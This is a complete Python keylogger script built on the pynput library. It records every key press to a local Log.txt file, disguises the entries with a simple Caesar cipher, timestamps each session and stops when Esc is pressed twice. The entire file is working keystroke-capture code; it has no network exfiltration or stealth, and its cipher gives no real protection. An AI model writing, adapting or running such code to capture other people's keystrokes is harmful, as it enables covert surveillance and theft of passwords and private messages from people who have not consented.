from pynput.keyboard import Key,Listener
from datetime import datetime

i = 1
prev_key = None


# Caesar Cipher Encryption

def encrypt(plaintext):
    shift = 22            #Modify the Shift Value
    ciphertext = ""
    for char in plaintext:
            if char.isalpha():
                if char.isupper():
                    ciphertext += chr((ord(char)-ord('A') + shift) % 26 + ord('A'))
                elif char.islower():
                    ciphertext += chr((ord(char) - ord('a') + shift) % 26 + ord('a'))
                else:
                    ciphertext += char
            else:
                ciphertext+=char
    return ciphertext



# Function called when a key is pressed
def key_pressed(key):
    global i
    encrypt_key = encrypt(str(key))
    try:    
        with open("Log.txt",'a') as k_write:
            k_write.write(f'{i}) {encrypt_key}\n')
            i += 1
    except FileNotFoundError as e:
        print(f'File Error\n{e}')
    
        


#Function to check if the "esc" key is pressed twice in a row
def key_released(key):
    global prev_key
    if key == Key.esc and prev_key == Key.esc:
        current_time = datetime.now().strftime("%a %d %b %Y, %H:%M")
        try:
            with open("Log.txt","a") as da_ti:
                # Write the end time to the log file
                da_ti.write(encrypt(f'\nEnd:  {current_time}\n'))
                return False     #Stop the listener
        except FileNotFoundError as e:
            print(f'File Error\n{e}')
    prev_key = key



if __name__ == "__main__":
    current_time = datetime.now().strftime("%a %d %b %Y, %H:%M")
    try:
        with open("Log.txt","a") as da_ti:
            # Write the start time to the log file
            da_ti.write(encrypt(f'\n\nStart:  {current_time}\n'))
            # Start the listener for keyboard events
        with Listener(on_press = key_pressed, on_release = key_released) as listener:
            listener.join()
    except FileNotFoundError as e:
        print(f'File Error\n{e}')



